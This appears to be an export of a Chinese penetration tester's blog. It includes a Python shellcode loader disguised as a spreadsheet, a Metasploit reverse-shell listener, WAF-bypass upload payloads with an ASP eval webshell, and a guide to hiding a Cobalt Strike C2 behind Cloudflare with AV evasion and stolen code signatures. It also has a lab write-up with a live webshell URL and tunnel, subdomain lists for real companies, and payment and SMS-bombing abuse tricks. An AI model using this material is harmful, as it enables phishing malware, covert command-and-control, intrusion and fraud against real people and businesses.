class="line">kernel32.VirtualAlloc.restype = ctypes.c_uint64  <span class="comment"># 返回类型为c_uint64sc</span></span><br><span class="line">sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)</span><br><span class="line">buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr)  <span class="comment"># 将shellcode指向指针</span></span><br><span class="line"><span class="comment"># print(sc_ptm)</span></span><br><span class="line"><span class="comment"># #print(buf_ptr)</span></span><br><span class="line">kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr), buf_ptr, ctypes.c_int(buf_size))  <span class="comment"># 调用dll,指向shellcode</span></span><br><span class="line"></span><br><span class="line">handle = kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.c_uint64(sc_ptr), ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.c_int(<span class="number">0</span>), ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller -F fish.py --icon=&quot;xlsx.ico&quot; -w</span><br></pre></td></tr></table></figure>

<p>-w 程序运行不显示窗口</p>
<p>–icon是图标</p>
<p>msf开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.0.122   </span><br><span class="line">set lport 2333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>面试题</title>
    <url>/2023/06/28/%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><h4 id="classloader是什么"><a href="#classloader是什么" class="headerlink" title="classloader是什么"></a>classloader是什么</h4><p>classloader是java动态类加载机制，在java中类加载分为加载，连接，初始化，classloader是负责加载和连接的，加载器可以根据需要动态的加载类，使得程序在运行时可以动态的扩展，无需在编译时将所有的类都加载进来</p>
<p>classloader实现了一种双亲委派模型，</p>
<p><strong>四种类加载器</strong></p>
<p>BootStrapClassLoader系统类根类加载器  加载 核心类库里面的类   java.lang包</p>
<p>PlatformClassLoader 平台类加载器  加载核心类库里面的一些类</p>
<p>AppClassLoader系统类加载器  加载的是自己编写的类</p>
<p>自定义类加载器  加载网络环境下的类</p>
<h6 id="加载自定义classloader的前提是什么"><a href="#加载自定义classloader的前提是什么" class="headerlink" title="加载自定义classloader的前提是什么"></a>加载自定义classloader的前提是什么</h6><p>加载自定义ClassLoader的前提是需要一个已经存在的ClassLoader。因为ClassLoader本身也是一个Java类，它也需要被加载和实例化。在Java中，所有的ClassLoader都是由其他ClassLoader加载的，最终都会由Bootstrap ClassLoader(系统根类加载器)加载。</p>
<h6 id="调用类的四种方法"><a href="#调用类的四种方法" class="headerlink" title="调用类的四种方法"></a>调用类的四种方法</h6><p>类.class</p>
<p>类.getClass()</p>
<p>Class.forName(“类”) </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">class&lt;?&gt; c = cl.loadclass(&quot;类&quot;)</span><br></pre></td></tr></table></figure>

<h6 id="fastjson的反序列化和普通反序列化漏洞的区别是什么"><a href="#fastjson的反序列化和普通反序列化漏洞的区别是什么" class="headerlink" title="fastjson的反序列化和普通反序列化漏洞的区别是什么?"></a>fastjson的反序列化和普通反序列化漏洞的区别是什么?</h6><p>普通的反序列化漏洞通常是针对Java对象序列化&#x2F;反序列化机制的漏洞，攻击者可以构造恶意的序列化数据，使得反序列化时执行恶意代码，从而实现攻击。而Fastjson的特性是支持反序列化时自动类型识别和类型转换，这为攻击者提供了构造<strong>恶意JSON字符串</strong>的机会。</p>
<p><strong>大概讲一下CommonCollections1的利用链，该利用链有什么样的限制?</strong></p>
<p><strong>在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗?</strong><br><strong>单向代码执行链如何实现执行多条语句，如CommonCollections1</strong> </p>
<p><strong>请简单讲述一下Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么?</strong> </p>
<h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><p><strong>administrator和system用户切换</strong></p>
<p>令牌窃取切换，计划任务</p>
<p><strong>NTML的V1和V2有什么区别</strong></p>
<p>加密方式不同，8位，16位</p>
<p><strong>ML和NTML有什么区别</strong></p>
<p>ML是第一版，采用des加密，密码14位 ，加密步骤 十几步   xp还在用</p>
<p>NTML   MD4加密非对称加密，步骤三步</p>
<p><strong>如何隐藏后门的服务</strong></p>
<p>设置访问控制</p>
<p><strong>黄金票据需要什么权限</strong></p>
<p><strong>判断是否存在域环境</strong></p>
<p>ipconfig &#x2F;all      看是否存在一个网段</p>
<p>net time &#x2F;domain   判断主域  域服务器通常会作为时间服务器使用</p>
<p>systeminfo</p>
<p>net config workstation   查看当前域与登录用户信息</p>
<p>探测域内存活主机：（nbtscan ）  nbtscan.exe 192.168.1.0&#x2F;24</p>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p><strong>空白页面怎么测</strong></p>
<p>改post，get  改ua，refer，origin,代理，翻js，目录爆破，漏扫工具扫</p>
<p><strong>绕过</strong></p>
<p>编码绕过</p>
<p><strong>403怎么测试</strong></p>
<p>改ip，改host，比如访问的admin目录，可以添加辣鸡字符绕过（&#x2F;*.），cdn,测ip  </p>
<p><strong>短信轰炸绕过</strong></p>
<p>改验证码，添加垃圾数据&#x2F;r&#x2F;n+,</p>
<p><strong>文件上传绕waf</strong></p>
<ol>
<li>filename换行绕过</li>
<li>多个等号绕过   例如：filename&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;”a.php”</li>
<li>增加文件大小，类似于sql注入的大量垃圾字符绕waf</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; aaaaaaaaaaaaaaaaaaaaa......aaaaaaaaaaaaaaaaaaaaa;name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure>

<p>4.去掉双引号或者替换成单引号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种：</span><br><span class="line">Content-Disposition: form-data; name=file1; filename=a.php</span><br><span class="line">第二种：</span><br><span class="line">Content-Disposition: form-data; name=&#x27;file1&#x27;; filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure>

<p>5.双写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename= ;  filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure>

<p>6.混淆waf匹配字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#混淆form-data</span><br><span class="line">Content-Disposition: name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">去除form-data</span><br><span class="line">Content-Disposition: AAAAAAAA=&quot;BBBBBBBB&quot;; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">替换form-data为垃圾值</span><br><span class="line">Content-Disposition: form-data   ; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">form-data后加空格</span><br><span class="line">Content-Disposition: for+m-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">form-data中加+</span><br><span class="line"></span><br><span class="line">#混淆ConTent-Disposition</span><br><span class="line">COntEnT-DIsposiTiOn: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">大小写混淆</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">调换Content-Type和ConTent-Disposition的顺序</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">增加额外的头</span><br><span class="line">AAAAAAAA:filename=&quot;aaa.jpg&quot;;</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">增加额外的头</span><br><span class="line">Content-Length: 666</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">增加额外的头</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>7.双文件绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">waf会把最后一个值作为接收参数，，老款中间件iis6.0会把第一个值作为参数</span><br></pre></td></tr></table></figure>

<p>8.容器waf对boundary要求不一致</p>
<p>一些WAF会认为两段Boundary不一致的数据是无意义的，不进行检测，而容器并没有严格要求，正常接收数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------471****1141173****525****99</span><br><span class="line">Content-Length: 253</span><br><span class="line">-----------------------------471****1141173****525****99</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%eval request(&quot;a&quot;)%&gt;</span><br><span class="line">-----------------------------471****1141173****525****99--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>9.条件竞争</p>
<p>绿盟笔试</p>
<p>1.客户在九月二号上线新门户网站，其中只有nginx代理的443端口是直接面向互联网开放。在九月四号SOC平台上监控到门户系统存在异常wget下载行为，SOC人员上去门户主机查看对应时间段的访问日志未发现明显的攻击访问记录，叙述后续排查思路</p>
<p>2.拿到一台机器的权限，如何判断什么协议出网以及怎样搭建隧道，负载均衡场景下的隧道又是怎样去搭建</p>
<p>3.假设现在已经通过打点的方式获取到一台服务器权限，详细说说你是怎样开展内网渗透的</p>
<p>4.在攻防演练中，只给你一个公司名称，说说通过哪些方式可以进入目标单位的内网，如何开展信息收集</p>
<p>5.一个网站存在命令执行漏洞，但是无回显，怎么深入利用</p>
<p>6.实战内网横向时，如何判断内网是否有域环境</p>
<p>8.请简要说明TCP连接的建立过程，并使用伪代码描述TCP服务端和客户端如何建立连接</p>
<p>9描述恶意样本分析的思路流程</p>
<p>10，目前存在一个前后端分离的web站点，请简述一下渗透思路</p>
<h3 id="ct蓝中"><a href="#ct蓝中" class="headerlink" title="ct蓝中"></a>ct蓝中</h3><p>SQL注入的类型,  报错注入函数三个，主流防御sql注入的方式</p>
<p> 报错函数  Polygon，GeometryCollection，MultiPoint，MultiLineString</p>
<p>中间件漏洞讲一下，weblogic，log4j，shiro,fastjson特征   jndi的攻击复现过没有，具体的细节是什么<br>监控的时候怎么区分扫描器和真实攻击ip<br>护网的时候用过什么设备<br>内网了解吗，xxx工具用过没</p>
<p>告警出现dns隐匿隧道，dns隐匿隧道如何区分，是不是误报  ，dns隧道和常规的dns解析有什么区别<br>ps：金融的一些内网流量可以dns解析出去，但是ping不通</p>
<p>落地的wabshell怎么开展工作，排查工具有什么<br>怎么排查自启动项</p>
<p>文件上传绕waf<br>溯源怎么溯<br>cs反制rce  （CVE-2022-39197,CVE-2022-23317,CVE-2021-36798)<br>内网的重点系统是什么，比如说集权之类的，域控算一个，还有什么</p>
<p>webshell工具特征</p>
<p>jsp马</p>
<p>不管是普通还是魔改的工具，都是post传输，因为webshell的payload过于巨大，超过了默认的tomcat header大小(8024字节)，所以只能使用POST传输，流量监测设备都是重点监控POST请求</p>
]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>利用cdn隐藏cs木马的真实ip</title>
    <url>/2023/09/28/%E9%85%8D%E7%BD%AE%E7%BD%91%E7%AB%99cdn/</url>
    <content><![CDATA[<p>修改域名绑定的dns服务器为cloudflare的服务器</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230929004813312.png" alt="image-20230929004813312"></p>
<p>添加dns记录，类型是A，名称www，ipv4地址是服务器的地址，开启代理</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230929005102088.png" alt="image-20230929005102088"></p>
<p>找到右侧的缓存——配置，翻到最下面打开开发模式，</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230929005245005.png" alt="image-20230929005245005"></p>
<p>找到规则——页面规则，创建两条规则分别是</p>
<ul>
<li><p><code>*.yuming.com/*</code>，选取设置为缓存级别——绕过</p>
</li>
<li><p><code>yuming.com/*</code>，选取设置为缓存级别——绕过</p>
</li>
</ul>
<p>找到右侧的SSSL&#x2F;TLS——概述，勾选灵活</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230929005621298.png" alt="image-20230929005621298"></p>
<p>SSL&#x2F;TLS——源服务器——创建证书，私钥类型选择ECC，点击创建。</p>
<p>保存公钥到server.pem,私钥到server.key,两个文件放到cs目录下</p>
<p>再cs文件夹下执行下面这两条命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out cfcert.pl2 -name cloudflare_cert -passout pass:123456     //密码一会再C2.profile中要用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123465 -destkeystore cfcert.store -srckeystore cfcert.pl2 -srcstoretype PKCS12 -srcstorepass 123456 -alias cloudflare_cert </span><br></pre></td></tr></table></figure>

<p>创建C2.profile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">	set keystore &quot;cfcert.store&quot;;</span><br><span class="line">	set password &quot;123456&quot;;   //刚才创建的密码</span><br><span class="line">&#125;</span><br><span class="line">http-config &#123;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;application&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">	set uri_x86 &quot;/api/1&quot;;</span><br><span class="line">	set uri_x64 &quot;/api/2&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">		header &quot;Host&quot; &quot;yumin.com&quot;;&#125;</span><br><span class="line">	server &#123;</span><br><span class="line">		output&#123;</span><br><span class="line">		print;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">		&#125;</span><br><span class="line">http-get &#123;</span><br><span class="line">	set uri &quot;/api/3&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">		header &quot;Host&quot; &quot;yumin.com&quot;;</span><br><span class="line">		metadata &#123;</span><br><span class="line">			base64;</span><br><span class="line">			header &quot;Cookie&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	server &#123;</span><br><span class="line">		output&#123;</span><br><span class="line">		print;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">		&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">	set uri &quot;/api/4&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">		header &quot;Host&quot; &quot;yumin.com&quot;;</span><br><span class="line">		id &#123;</span><br><span class="line">			uri-append;</span><br><span class="line">			&#125;</span><br><span class="line">		output&#123;</span><br><span class="line">		print;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	server &#123;</span><br><span class="line">		output&#123;</span><br><span class="line">		print;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（可以不做）修改teamserver文件里面的端口</p>
<p>启动cs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash teamserver &lt;VPSip&gt; &lt;密码&gt; C2.profile</span><br></pre></td></tr></table></figure>

<p>CS生成木马，做个免杀直接用就可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编译木马</span><br><span class="line">go build test.go</span><br><span class="line">压缩木马</span><br><span class="line">upx64  test.exe</span><br></pre></td></tr></table></figure>



<p>签名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/TideSec/GoBypassAV/tree/main/SignThief</span><br><span class="line"></span><br><span class="line">使用方法</span><br><span class="line">type info.txt</span><br><span class="line">-i -t -o </span><br><span class="line"> </span><br><span class="line">python sigthief.py  -i &lt;伪造的文件路径&gt; -t&lt;木马的文件路径&gt; -o&lt;重新生成的文件路径&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/manifest.json</url>
    <content><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>这是一个标签页</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>wangzhi的好朋友们</title>
    <url>/link/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>临时</title>
    <url>/%E4%B8%B4%E6%97%B6.html</url>
    <content><![CDATA[<p><a href="http://119.45.114.224:7001/_async/webshell.jsp?password=youli&cmd=whoami">http://119.45.114.224:7001/_async/webshell.jsp?password=youli&amp;cmd=whoami</a></p>
<p>主机信息：<br>该环境有3台主机，第一台主机访问地址为：119.45.114.224:7001（备用地址：175.27.226.213:7001），剩余两台主机需要各位进行可能的内网代理、端口转发等操作进行发现和渗透<br>当前FLAG2信息如下：<br>meetsec2：在第二台主机的数据库内，格式为“meetsec2{XXX}”，分数为：50分<br>内网范围在：172.16.10.0&#x2F;24、172.25.20.0&#x2F;24、172.26.30.0&#x2F;24</p>
<p>工具扫一下</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708150827239.png" alt="image-20230708150827239"></p>
<p>运行ls看一下</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708150839692.png" alt="image-20230708150839692"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>找一下路径</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imge47393833d3027d71eb640c027de5d8.png" alt="e47393833d3027d71eb640c027de5d8"></p>
<p><del><a href="http://119.45.114.224:7001/">http://119.45.114.224:7001</a></del></p>
<p><del>&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls9_async_response&#x2F;8tpkys&#x2F;war&#x2F;</del></p>
<p>传reg,</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708155723636.png" alt="image-20230708155723636"></p>
<p>python neoreg.py -k wangzhi -u <a href="http://119.45.114.224:7001/_async/tunnel.jsp">http://119.45.114.224:7001/_async/tunnel.jsp</a></p>
<p>连接</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708161205134.png" alt="image-20230708161205134"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708162642964.png" alt="image-20230708162642964"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708161711057.png" alt="image-20230708161711057"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708163911244.png" alt="image-20230708163911244"></p>
<p>&#x2F;root&#x2F;Documents&#x2F;fscan-main</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230708190531119.png" alt="image-20230708190531119"></p>
<p>kylinos.cn<br><a href="http://www.inst.kylinos.cn/">www.inst.kylinos.cn</a><br>servicedesk.kylinos.cn<br>eco.kylinos.cn<br>meeting.kylinos.cn<br>distro-images.kylinos.cn<br>archive2.kylinos.cn<br>smtp.kylinos.cn<br>mail.kylinos.cn<br>id.kylinos.cn<br>education.kylinos.cn<br>edu.kylinos.cn<br>api.kylinos.cn<br>wx.kylinos.cn<br>archive-file.kylinos.cn<br>m.kylinos.cn<br>kylinos.cn<br>oa.kylinos.cn<br><a href="http://www.kylinos.cn/">www.kylinos.cn</a><br>archive.kylinos.cn</p>
<p>mail.greatwall.com.cn<br>gwservicetest.greatwall.com.cn<br>dns2.greatwall.com.cn<br>dns1.greatwall.com.cn<br>vpn.greatwall.com.cn<br>greatwall.com.cn<br>kk.greatwall.com.cn<br>vp.greatwall.com.cn<br><a href="http://www.greatwall.com.cn/">www.greatwall.com.cn</a><br>gwsite2.greatwall.com.cn<br>ekp.greatwall.com.cn<br>gwoa01.greatwall.com.cn<br>gwsapdev03.greatwall.com.cn<br>oa.greatwall.com.cn<br>avast.com.greatwall.com.cn</p>
<p>doc.nrec.com<br>mail.nrec.com<br>vpn.nrec.com<br>web.nrec.com<br><a href="http://www.nrec.com/">www.nrec.com</a><br>qys.nrec.com<br><a href="http://www.nslb.nrec.com/">www.nslb.nrec.com</a><br>smtp.nrec.com<br>app.nrec.com<br>esb.nrec.com<br>oa.nrec.com<br>pop.nrec.com<br>imap.nrec.com<br>svn.nrec.com<br>mis.nrec.com</p>
<p>​	</p>
]]></content>
  </entry>
  <entry>
    <title>逻辑漏洞</title>
    <url>/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>1.修改时间漏洞（修改本地时间，会员问题）</p>
<p>客户端本地时间校验</p>
<p>2.xxe漏洞攻击</p>
<p>工具准备 链接：<a href="https://pan.baidu.com/s/1dTkI2vHmLBwW6c3W4MRWRg?pwd=53z7">https://pan.baidu.com/s/1dTkI2vHmLBwW6c3W4MRWRg?pwd=53z7</a> </p>
<p>提取码：53z7 </p>
<p>core.xml文件，上传恶意xslx文件。然后查看vps有没有回连</p>
<p>3.不安全的资源调用（国企，银行不会存在这类漏洞）</p>
<p>免费调用接口查信息</p>
<p>4.自己添加参数，删除参数</p>
<p>xxx&#x2F;getuid 修改为 xxx&#x2F;getuid&#x3D;1</p>
<p>5.鉴权，继续拼接参数或者删除参数</p>
<h2 id="6-支付漏洞"><a href="#6-支付漏洞" class="headerlink" title="6.支付漏洞"></a>6.支付漏洞</h2><p>下单的时候有两个id值，图片和价格，修改一项，用第二个产品的价格购买第一个产品</p>
<p><strong>7.生成订单的时候修改价格</strong>，</p>
<p>—-有时候一个订单价格可以由好几个参数决定</p>
<p>同一个请求包，num:0.01修改价格成功并且成功付款，算一个</p>
<p>同一个请求包，price:0.01修改价格成功并且成功付款，算一个</p>
<p>参数不同，就是多个漏洞</p>
<p><strong>8.付款的时候提示禁止修改价格</strong></p>
<p>吧第一个成功的返回包替换到第二个</p>
<p><a href="http://xxxx.com/buysomething/yesbuyid?id=12222">http://xxxx.com/buysomething/yesbuyid?id=12222</a></p>
<p><strong>25.盲盒或者抽奖</strong></p>
<p>盲盒是奖励是固定的，抽奖是随机奖励，抓包查看id。或者下单的时候查看。或者查询订单，就是订单未付款但是查询订单结果。</p>
<p>一个盲盒 你先到达支付页面 然后再回收这个盲盒，再支付(支付邮费)。此时可能商品会待发货而且已经回收的状态</p>
<p>支付时多次生成订单，然后对每个订单都付款。(多次付款同一个商品)</p>
<p><strong>27.订单漏洞，</strong></p>
<p>未付款提前发货，未付款退款问题，修改数量，修改价格，负数，小数，用微信支付，或者余额支付，所有漏洞都要等发货了再交，绕过人工审核这一环节</p>
<p><strong>47.修改返回的length长度</strong></p>
<p>论文查重  传文件 长度13000改成1500</p>
<p>价格从300变成6块</p>
<p><strong>30.溢出</strong></p>
<p>-2147483648到2147483647</p>
<p>2147483648比这个多1元，溢出就付1元了，可能会宕机，如果服务器无法计算</p>
<p><strong>32.消耗订单数量漏洞</strong></p>
<h2 id="14-验证码类"><a href="#14-验证码类" class="headerlink" title="14.验证码类"></a>14.验证码类</h2><p>验证码复用</p>
<p>验证码通用000000 123456</p>
<p>验证码可以爆破，验证码六位数可以爆破，如果可以复用，才可能存在爆破的可能性</p>
<p>A手机的验证码B可以用 </p>
<p>返回包内验证码回显</p>
<p>验证码双发，phone&#x3D;18888888888&amp;phone&#x3D;15623652651,两个手机号获得同样的验证码</p>
<p>验证码转发 逗号接上下一个手机号，</p>
<p>已知邮箱验证链接，观察跳转连接的url，token  </p>
<p><strong>修改返回包内容验证码</strong>绕过500改成200，false改成true</p>
<p>短信轰炸有限制，<strong>可以删除cookie</strong>,尝试绕过手机号码前后加空格，86,086，0086</p>
<p>&#x2F;r，&#x2F;n，以及特殊符号等修改cookie，变量，</p>
<p>返回138888888889 12位经过短信网关取前11位，导致短信轰炸进行能解析的编码</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>9.学号改工号</p>
<p>{“xh”:10000001}改为{“gh”:”sysadmin”} 返回包修改类型或者usertype:”2”改成1</p>
<p>10.腾讯地图apikey泄露——低危</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;https://map.qg.com/api/gljs?v=1.exp&amp;key=ZBBZ-*********-N563Z-ISDSD5&quot;</span><br></pre></td></tr></table></figure>



<p>11,。微信session_key泄露</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage.png"></p>
<p><a href="https://mp.weixin.qq.com/s/t-PCV7pAs448wf3pKIZmgg">https://mp.weixin.qq.com/s/t-PCV7pAs448wf3pKIZmgg</a></p>
<p>12.没登录的情况下，翻js，未授权等漏洞</p>
<p>在登录的情况下翻js （有些js是动态加载的，翻管理员功能接口</p>
<p>13.一闪而过的允许点击（三个功能点）</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230730203447700.png" alt="image-20230730203447700"></p>
<p>点击选项三  url是   xxxx&#x2F;type&#x3D;3   修改成2</p>
<p>15.<html><script>alert('XSS is easy');</script><html> png 图片会弹框</p>
<p>16.host主机钓鱼 邮件发送 多添加一条hostreferer</p>
<p><a href="https://blog.csdn.net/angry_program/article/details/109034421">https://blog.csdn.net/angry_program/article/details/109034421</a></p>
<p>17.email&#x3D;<a href="mailto:&#x31;&#x32;&#51;&#64;&#x65;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#x31;&#x32;&#51;&#64;&#x65;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a>&amp;email&#x3D;<a href="mailto:&#x31;&#x32;&#51;&#x40;&#x65;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x31;&#x32;&#51;&#x40;&#x65;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a></p>
<p>email&#x3D;<a href="mailto:&#49;&#x32;&#x33;&#64;&#101;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;">&#49;&#x32;&#x33;&#64;&#101;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;</a> %20email&#x3D;<a href="mailto:&#x31;&#x32;&#x33;&#64;&#101;&#x6d;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#109;">&#x31;&#x32;&#x33;&#64;&#101;&#x6d;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#109;</a></p>
<p>email&#x3D;<a href="mailto:&#x31;&#x32;&#x33;&#x40;&#101;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#x31;&#x32;&#x33;&#x40;&#101;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a> | email&#x3D;<a href="mailto:&#49;&#x32;&#51;&#64;&#101;&#x6d;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;">&#49;&#x32;&#51;&#64;&#101;&#x6d;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;</a></p>
<p>%0a%0 ,  </p>
<p>18.订单功能取消，true改成false钱退回来，订单还是成功的状态</p>
<p>19.删除用户提示没有权限，将host改成localhost  绕403  x-forward-for:127.0.0.1</p>
<p>插件fakeip</p>
<p>20.领取新人礼包，然后换绑账号（注销继续领取）尝试继续领取</p>
<p>21.领一次的东西   并发</p>
<p>22并发导致越权，过waf  &lt; &gt; 拦截  大量发包        服务器反应不过来</p>
<p>23.数字型溢出  0.1不行    一直加0</p>
<p>24.签约漏洞</p>
<p>升级会员普通会员10元，升级为超级会员在加5块，两个客户端同时登陆付款</p>
<p>26.推广漏洞，新人无限刷，用户注销重新推广</p>
<p>29.并发</p>
<p>5块钱余额，提现两次或以上并发更容易成功</p>
<p>所有只能一次的地方都要想着并发</p>
